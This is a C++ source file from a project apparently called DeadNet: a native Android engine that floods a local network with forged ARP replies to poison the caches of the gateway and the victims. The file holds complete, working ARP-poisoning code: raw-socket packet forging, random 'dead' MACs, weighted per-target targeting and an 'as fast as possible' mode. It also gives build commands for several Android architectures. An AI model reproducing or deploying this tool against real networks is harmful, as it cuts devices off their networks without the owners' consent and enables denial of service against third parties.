// ====================================================================================================================
//  DeadNet dynamic ARP emission engine  (emit.cpp)
// --------------------------------------------------------------------------------------------------------------------
//  Native, target-driven ARP poisoner for the multi-card redesign. One instance per Transmitter card. It mmaps a
//  SEQLOCK-protected FOCUS control buffer (written by the Python RowReaderArbiter.publish_focus) and a STATS buffer
//  (written here, read by the Python side). Byte offsets are the contract in apk/engine/contracts.py (FOCUS_* /
//  STATS_*) and are mirrored EXACTLY below -- do not drift from them.
//
//  argv:  <iface> <focus_shm_path> <stats_shm_path> <publish_interval_ms>
//
//  Per cycle it seqlock-reads the focus buffer and, for every target entry, forges ARP replies that mirror arp.cpp:
//  raw PF_PACKET/SOCK_RAW socket, ARPOP_REPLY, a fresh random locally-administered ("dead") sender MAC from
//  /dev/urandom. It poisons BOTH directions like deadnet.py's poison_arp_single_host when possible:
//    (b) tell the GATEWAY that victim_ip is at a dead MAC  (sender proto = victim_ip, L2 dst = gateway_mac).
//        Always possible from the contract. If the gateway's IPv4 is unknown it is emitted gratuitous-style
//        (sender proto == target proto == victim_ip) so the gateway still updates its cache for the victim.
//    (a) tell the VICTIM that gateway_ip is at a dead MAC  (sender proto = gateway_ip, L2 dst = victim_mac/bcast).
//        The focus contract carries gateway_mac + our_mac but NOT the gateway IPv4, so this direction is emitted
//        only when the gateway IPv4 can be recovered from the focus set itself -- i.e. the entry whose MAC equals
//        the header gateway_mac (present in UNFOCUSED whole-subnet mode). That entry is never poisoned as a victim.
//  Ethernet source MAC is our_mac (so sniff.cpp attributes the frames as our ARP_TX); the dead MAC lives in the ARP
//  sender-hardware field exactly like deadnet.py's RandMAC(). Effort is distributed by per-entry weight (FOCUSED) or
//  evenly (UNFOCUSED). interval_us paces per target (0 => no sleep; FOCUS_FLAG_0TTL => send as fast as possible).
//  Cumulative per-target tx_pkts/tx_bytes are published to the STATS buffer every <publish_interval_ms>.
//
// --------------------------------------------------------------------------------------------------------------------
//  BUILD (NDK r26d, Android 29, static, stripped) -- run from apk/ :
//    LLVM=/srv/deadnet-build/ndk/android-ndk-r26d/toolchains/llvm/prebuilt/linux-x86_64/bin
//    $LLVM/aarch64-linux-android29-clang++      -O2 -static -s src/emit.cpp -o assets/emit.arm64
//    $LLVM/armv7a-linux-androideabi29-clang++   -O2 -static -s src/emit.cpp -o assets/emit.arm
//    $LLVM/i686-linux-android29-clang++         -O2 -static -s src/emit.cpp -o assets/emit.x86
//    $LLVM/x86_64-linux-android29-clang++       -O2 -static -s src/emit.cpp -o assets/emit.x86_64
//  Host offset-agreement test (throwaway, not shipped):
//    g++ -O2 -DEMIT_HOST_TEST src/emit.cpp -o /tmp/emit_hosttest   (provides a focus-dump main())
// ====================================================================================================================

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>

// ---- shared-memory contract (must match apk/engine/contracts.py) ---------------------------------------------------
static const uint32_t FOCUS_HEADER_SIZE = 32;
static const uint32_t FOCUS_ENTRY_SIZE  = 24;
static const uint32_t FOCUS_MAX_ENTRIES = 1024;
static const uint32_t FOCUS_FILE_SIZE   = FOCUS_HEADER_SIZE + FOCUS_ENTRY_SIZE * FOCUS_MAX_ENTRIES; // 24608
static const uint32_t FOCUS_FLAG_0TTL   = 1u << 0;

static const uint32_t STATS_HEADER_SIZE = 16;
static const uint32_t STATS_ENTRY_SIZE  = 24;
static const uint32_t STATS_MAX_ENTRIES = FOCUS_MAX_ENTRIES;
static const uint32_t STATS_FILE_SIZE   = STATS_HEADER_SIZE + STATS_ENTRY_SIZE * STATS_MAX_ENTRIES; // 24592

static const uint32_t MODE_UNFOCUSED = 0;
static const uint32_t MODE_FOCUSED   = 1;

#pragma pack(push, 1)
// FOCUS (control) file, Python -> C++
struct FocusHeader {           // 32 bytes
    uint32_t seq;              // 0  seqlock (even = stable)
    uint32_t mode;             // 4  0=UNFOCUSED, 1=FOCUSED
    uint32_t count;            // 8  number of valid entries
    uint32_t gen;              // 12 generation id
    uint8_t  gateway_mac[6];   // 16 real gateway MAC we impersonate
    uint8_t  our_mac[6];       // 22 our iface MAC
    uint32_t flags;            // 28 bit0 = FOCUS_FLAG_0TTL
};
struct FocusEntry {            // 24 bytes
    uint32_t ip_be;            // 0  target IPv4, network byte order (raw octets a.b.c.d in memory)
    uint8_t  mac[6];           // 4  target MAC; all-zero => unknown (resolve/broadcast)
    uint16_t _pad;             // 10
    float    weight;           // 12 attention share, normalized 0..1
    uint32_t interval_us;      // 16 per-target send interval, 0 = as-fast
    uint32_t _reserved;        // 20
};
// STATS file, C++ -> Python
struct StatsHeader {           // 16 bytes
    uint32_t seq;              // 0  seqlock
    uint32_t count;            // 4
    uint64_t ts_ms;            // 8  emit clock at publish
};
struct StatsEntry {            // 24 bytes
    uint32_t ip_be;            // 0
    uint64_t tx_pkts;          // 4  cumulative frames aimed at this target
    uint64_t tx_bytes;         // 12
    uint32_t _reserved;        // 20
};
#pragma pack(pop)

// Compile-time guards: the structs must be the exact contract sizes/offsets.
static_assert(sizeof(FocusHeader) == 32, "FocusHeader must be 32 bytes");
static_assert(sizeof(FocusEntry)  == 24, "FocusEntry must be 24 bytes");
static_assert(sizeof(StatsHeader) == 16, "StatsHeader must be 16 bytes");
static_assert(sizeof(StatsEntry)  == 24, "StatsEntry must be 24 bytes");
static_assert(offsetof(FocusHeader, gateway_mac) == 16, "gateway_mac offset");
static_assert(offsetof(FocusHeader, our_mac) == 22, "our_mac offset");
static_assert(offsetof(FocusHeader, flags) == 28, "flags offset");
static_assert(offsetof(FocusEntry, weight) == 12, "weight offset");
static_assert(offsetof(FocusEntry, interval_us) == 16, "interval_us offset");
static_assert(offsetof(StatsEntry, tx_pkts) == 4, "tx_pkts offset");
static_assert(offsetof(StatsEntry, tx_bytes) == 12, "tx_bytes offset");

// ---- parsed snapshot of the focus buffer ---------------------------------------------------------------------------
struct FocusView {
    uint32_t  mode;
    uint32_t  count;
    uint32_t  gen;
    uint32_t  flags;
    uint8_t   gateway_mac[6];
    uint8_t   our_mac[6];
    FocusEntry entries[FOCUS_MAX_ENTRIES];
};

// SEQLOCK read of the focus buffer. Returns 0 on a stable read, -1 if no stable snapshot within the retry budget.
static int read_focus(const uint8_t *base, FocusView *v) {
    const volatile uint32_t *seqp = (const volatile uint32_t *)base;
    for (int tries = 0; tries < 100000; ++tries) {
        uint32_t s1 = __atomic_load_n(seqp, __ATOMIC_ACQUIRE);
        if (s1 & 1u) continue;                       // writer mid-update
        __atomic_thread_fence(__ATOMIC_ACQUIRE);

        const FocusHeader *h = (const FocusHeader *)base;
        v->mode  = h->mode;
        v->gen   = h->gen;
        v->flags = h->flags;
        memcpy(v->gateway_mac, h->gateway_mac, 6);
        memcpy(v->our_mac, h->our_mac, 6);

        uint32_t count = h->count;
        if (count > FOCUS_MAX_ENTRIES) count = FOCUS_MAX_ENTRIES;   // clamp (also guards torn reads)
        v->count = count;
        const FocusEntry *es = (const FocusEntry *)(base + FOCUS_HEADER_SIZE);
        memcpy(v->entries, es, (size_t)count * FOCUS_ENTRY_SIZE);

        __atomic_thread_fence(__ATOMIC_ACQUIRE);
        uint32_t s2 = __atomic_load_n(seqp, __ATOMIC_ACQUIRE);
        if (s1 == s2 && !(s2 & 1u)) return 0;        // stable
    }
    return -1;
}

static int mac_is_zero(const uint8_t *m) {
    return (m[0] | m[1] | m[2] | m[3] | m[4] | m[5]) == 0;
}

#ifndef EMIT_HOST_TEST
// ====================================================================================================================
//  Device build: real emitter
// ====================================================================================================================

static volatile sig_atomic_t g_run = 1;
static void on_signal(int sig) { (void)sig; g_run = 0; }

static long long now_ms() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000LL + ts.tv_nsec / 1000000LL;
}

static int g_urandom_fd = -1;

// Fresh random locally-administered ("dead") unicast MAC, mirroring arp.cpp / deadnet.py RandMAC().
static void dead_mac(uint8_t *out) {
    if (g_urandom_fd < 0 || read(g_urandom_fd, out, 6) != 6) {
        for (int i = 0; i < 6; i++) out[i] = (uint8_t)(rand() & 0xFF);
    }
    out[0] |= 0x02;   // locally administered
    out[0] &= ~0x01;  // unicast
}

// Forge and send one ARP reply, mirroring arp.cpp's packet construction.
//   spa4/tpa4 : 4 raw network-order IPv4 bytes (the ip_be field bytes)
static void send_arp_reply(int sock, int ifindex,
                           const uint8_t *eth_dst, const uint8_t *eth_src,
                           const uint8_t *sha, const uint8_t *spa4,
                           const uint8_t *tha, const uint8_t *tpa4) {
    unsigned char buffer[ETH_ZLEN];
    memset(buffer, 0, sizeof(buffer));

    struct ether_header eh;
    memcpy(eh.ether_dhost, eth_dst, ETH_ALEN);
    memcpy(eh.ether_shost, eth_src, ETH_ALEN);
    eh.ether_type = htons(ETH_P_ARP);

    struct ether_arp arp;
    arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp.ea_hdr.ar_hln = ETH_ALEN;
    arp.ea_hdr.ar_pln = 4;
    arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
    memcpy(arp.arp_sha, sha, ETH_ALEN);
    memcpy(arp.arp_spa, spa4, 4);
    memcpy(arp.arp_tha, tha, ETH_ALEN);
    memcpy(arp.arp_tpa, tpa4, 4);

    memcpy(buffer, &eh, sizeof(eh));
    memcpy(buffer + sizeof(eh), &arp, sizeof(arp));

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family   = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex  = ifindex;
    sa.sll_halen    = ETH_ALEN;
    memcpy(sa.sll_addr, eth_dst, ETH_ALEN);

    (void)sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&sa, sizeof(sa));
}

// ---- cumulative per-target tx counters (survive focus-set changes) -------------------------------------------------
// Open-addressing hash keyed by ip_be. Sized well above FOCUS_MAX_ENTRIES to keep load factor low.
struct TxSlot { uint32_t ip_be; uint8_t used; uint64_t pkts; uint64_t bytes; };
static const uint32_t TX_CAP = 4096;                 // power of two
static TxSlot g_tx[TX_CAP];

static TxSlot *tx_get(uint32_t ip_be) {
    uint32_t h = ip_be * 2654435761u;
    for (uint32_t i = 0; i < TX_CAP; i++) {
        uint32_t idx = (h + i) & (TX_CAP - 1);
        if (!g_tx[idx].used) { g_tx[idx].used = 1; g_tx[idx].ip_be = ip_be; g_tx[idx].pkts = 0; g_tx[idx].bytes = 0; return &g_tx[idx]; }
        if (g_tx[idx].ip_be == ip_be) return &g_tx[idx];
    }
    return NULL;  // table full (never, given TX_CAP >> max targets)
}

static void publish_stats(uint8_t *stats_base, const FocusView *v) {
    volatile uint32_t *seqp = (volatile uint32_t *)stats_base;
    uint32_t cur = *seqp;
    if (cur & 1u) cur += 1;                 // recover from a torn prior write
    uint32_t odd  = cur + 1;
    uint32_t even = cur + 2;

    __atomic_store_n(seqp, odd, __ATOMIC_RELEASE);
    __atomic_thread_fence(__ATOMIC_RELEASE);

    uint32_t count = v->count;
    if (count > STATS_MAX_ENTRIES) count = STATS_MAX_ENTRIES;

    StatsHeader h;
    h.seq   = odd;                          // body copy of seq is informational; the live lock is at offset 0
    h.count = count;
    h.ts_ms = (uint64_t)now_ms();
    memcpy(stats_base, &h, sizeof(h));

    uint8_t *ep = stats_base + STATS_HEADER_SIZE;
    for (uint32_t i = 0; i < count; i++) {
        TxSlot *s = tx_get(v->entries[i].ip_be);
        StatsEntry se;
        se.ip_be     = v->entries[i].ip_be;
        se.tx_pkts   = s ? s->pkts : 0;
        se.tx_bytes  = s ? s->bytes : 0;
        se._reserved = 0;
        memcpy(ep, &se, sizeof(se));
        ep += STATS_ENTRY_SIZE;
    }

    __atomic_thread_fence(__ATOMIC_RELEASE);
    __atomic_store_n(seqp, even, __ATOMIC_RELEASE);
}

// mmap a shared file at the required size, creating/growing it if needed. prot = PROT_READ or PROT_READ|PROT_WRITE.
static uint8_t *map_shm(const char *path, uint32_t size, int prot, int *out_fd) {
    int flags = (prot & PROT_WRITE) ? O_RDWR : O_RDWR;   // O_RDWR either way so we may ftruncate
    int fd = open(path, flags | O_CREAT, 0600);
    if (fd < 0) { perror("open shm"); return NULL; }
    struct stat st;
    if (fstat(fd, &st) == 0 && (uint32_t)st.st_size < size) {
        if (ftruncate(fd, size) != 0) { perror("ftruncate"); close(fd); return NULL; }
    }
    void *m = mmap(NULL, size, prot, MAP_SHARED, fd, 0);
    if (m == MAP_FAILED) { perror("mmap"); close(fd); return NULL; }
    *out_fd = fd;
    return (uint8_t *)m;
}

int main(int argc, char *argv[]) {
    // argv: <iface> <focus_shm_path> <stats_shm_path> <publish_interval_ms>
    if (argc != 5) {
        fprintf(stderr, "usage: %s <iface> <focus_shm_path> <stats_shm_path> <publish_interval_ms>\n", argv[0]);
        return EXIT_FAILURE;
    }
    const char *iface       = argv[1];
    const char *focus_path  = argv[2];
    const char *stats_path  = argv[3];
    long publish_interval_ms = atol(argv[4]);
    if (publish_interval_ms <= 0) publish_interval_ms = 500;

    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);

    g_urandom_fd = open("/dev/urandom", O_RDONLY);

    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) { perror("socket"); return EXIT_FAILURE; }

    int ifindex = if_nametoindex(iface);
    if (ifindex == 0) { perror("if_nametoindex"); close(sock); return EXIT_FAILURE; }

    int focus_fd = -1, stats_fd = -1;
    uint8_t *focus_base = map_shm(focus_path, FOCUS_FILE_SIZE, PROT_READ, &focus_fd);
    if (!focus_base) { close(sock); return EXIT_FAILURE; }
    uint8_t *stats_base = map_shm(stats_path, STATS_FILE_SIZE, PROT_READ | PROT_WRITE, &stats_fd);
    if (!stats_base) { munmap(focus_base, FOCUS_FILE_SIZE); close(sock); return EXIT_FAILURE; }

    static FocusView view;               // static: large, keep off the stack
    const uint8_t BCAST[6]  = {0xff,0xff,0xff,0xff,0xff,0xff};
    const uint8_t ZERO6[6]  = {0,0,0,0,0,0};
    const int FRAMES_PER_CYCLE = 64;     // effort budget distributed by weight in FOCUSED mode

    long long next_publish = now_ms() + publish_interval_ms;

    while (g_run) {
        if (read_focus(focus_base, &view) != 0) {
            // Could not get a stable snapshot (writer thrashing); back off briefly.
            usleep(1000);
        } else {
            uint32_t count = view.count;
            int gw_known = !mac_is_zero(view.gateway_mac);

            // eth source: our_mac if set, else a throwaway dead MAC so frames still egress.
            uint8_t eth_src[6];
            if (!mac_is_zero(view.our_mac)) memcpy(eth_src, view.our_mac, 6);
            else dead_mac(eth_src);

            // Recover the gateway IPv4 (not in the contract header) from the entry whose MAC == gateway_mac.
            // Present in UNFOCUSED whole-subnet mode; enables the victim-side (direction a) poison.
            uint8_t gw_ip[4]; int have_gw_ip = 0; uint32_t gw_entry = 0xFFFFFFFFu;
            if (gw_known) {
                for (uint32_t i = 0; i < count; i++) {
                    if (memcmp(view.entries[i].mac, view.gateway_mac, 6) == 0) {
                        memcpy(gw_ip, &view.entries[i].ip_be, 4);
                        have_gw_ip = 1; gw_entry = i;
                        break;
                    }
                }
            }

            int zero_ttl = (view.flags & FOCUS_FLAG_0TTL) != 0;

            for (uint32_t i = 0; i < count && g_run; i++) {
                if (i == gw_entry) continue;                 // never poison the gateway as if it were a victim
                const FocusEntry *e = &view.entries[i];

                uint8_t vic_ip[4];
                memcpy(vic_ip, &e->ip_be, 4);
                int vic_mac_known = !mac_is_zero(e->mac);
                const uint8_t *vic_mac = vic_mac_known ? e->mac : BCAST;

                // Effort for this entry: weighted in FOCUSED mode, flat in UNFOCUSED.
                int reps = 1;
                if (view.mode == MODE_FOCUSED) {
                    float w = e->weight;
                    if (w < 0.0f) w = 0.0f;
                    if (w > 1.0f) w = 1.0f;
                    reps = (int)(w * FRAMES_PER_CYCLE + 0.5f);
                    if (reps < 1) reps = 1;
                }

                uint64_t frames = 0;
                for (int r = 0; r < reps && g_run; r++) {
                    uint8_t dmac[6];

                    // (b) poison the gateway: victim_ip -> dead MAC. Needs no gateway IP; gratuitous when unknown.
                    if (gw_known) {
                        dead_mac(dmac);
                        const uint8_t *tpa = have_gw_ip ? gw_ip : vic_ip;   // gratuitous fallback (spa==tpa)
                        send_arp_reply(sock, ifindex, view.gateway_mac, eth_src,
                                       dmac, vic_ip, view.gateway_mac, tpa);
                        frames++;
                    }

                    // (a) poison the victim: gateway_ip -> dead MAC. Only when gateway IPv4 is recoverable.
                    if (have_gw_ip) {
                        dead_mac(dmac);
                        const uint8_t *tha = vic_mac_known ? e->mac : ZERO6;
                        send_arp_reply(sock, ifindex, vic_mac, eth_src,
                                       dmac, gw_ip, tha, vic_ip);
                        frames++;
                    }

                    // pacing: honor per-target interval unless 0-ttl "as fast as possible"
                    if (!zero_ttl && e->interval_us > 0) usleep(e->interval_us);
                }

                if (frames) {
                    TxSlot *s = tx_get(e->ip_be);
                    if (s) { s->pkts += frames; s->bytes += frames * (uint64_t)ETH_ZLEN; }
                }
            }

            if (count == 0) usleep(2000);   // idle: avoid a busy spin while the focus set is empty
        }

        long long t = now_ms();
        if (t >= next_publish) {
            publish_stats(stats_base, &view);
            next_publish = t + publish_interval_ms;
        }
    }

    // Final stats flush so the Python side sees the last totals, then clean up.
    publish_stats(stats_base, &view);
    munmap(focus_base, FOCUS_FILE_SIZE);
    munmap(stats_base, STATS_FILE_SIZE);
    if (g_urandom_fd >= 0) close(g_urandom_fd);
    close(focus_fd);
    close(stats_fd);
    close(sock);
    return EXIT_SUCCESS;
}

#else
// ====================================================================================================================
//  Host offset-agreement test build (-DEMIT_HOST_TEST): dump a focus file through the SAME read_focus() parser.
//  Throwaway; not shipped. Usage: emit_hosttest <focus_file>
// ====================================================================================================================
int main(int argc, char *argv[]) {
    if (argc != 2) { fprintf(stderr, "usage: %s <focus_file>\n", argv[0]); return 2; }
    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 2; }
    static uint8_t buf[FOCUS_FILE_SIZE];
    size_t n = fread(buf, 1, FOCUS_FILE_SIZE, f);
    fclose(f);
    if (n < FOCUS_HEADER_SIZE) { fprintf(stderr, "short file: %zu\n", n); return 2; }

    static FocusView v;
    if (read_focus(buf, &v) != 0) { fprintf(stderr, "no stable seqlock read\n"); return 2; }

    printf("mode=%u count=%u gen=%u flags=%u\n", v.mode, v.count, v.gen, v.flags);
    printf("gateway_mac=%02x:%02x:%02x:%02x:%02x:%02x our_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
           v.gateway_mac[0],v.gateway_mac[1],v.gateway_mac[2],v.gateway_mac[3],v.gateway_mac[4],v.gateway_mac[5],
           v.our_mac[0],v.our_mac[1],v.our_mac[2],v.our_mac[3],v.our_mac[4],v.our_mac[5]);
    for (uint32_t i = 0; i < v.count; i++) {
        const FocusEntry *e = &v.entries[i];
        const uint8_t *ip = (const uint8_t *)&e->ip_be;
        printf("entry[%u] ip=%u.%u.%u.%u mac=%02x:%02x:%02x:%02x:%02x:%02x weight=%.6f interval_us=%u\n",
               i, ip[0], ip[1], ip[2], ip[3],
               e->mac[0],e->mac[1],e->mac[2],e->mac[3],e->mac[4],e->mac[5],
               (double)e->weight, e->interval_us);
    }
    return 0;
}
#endif
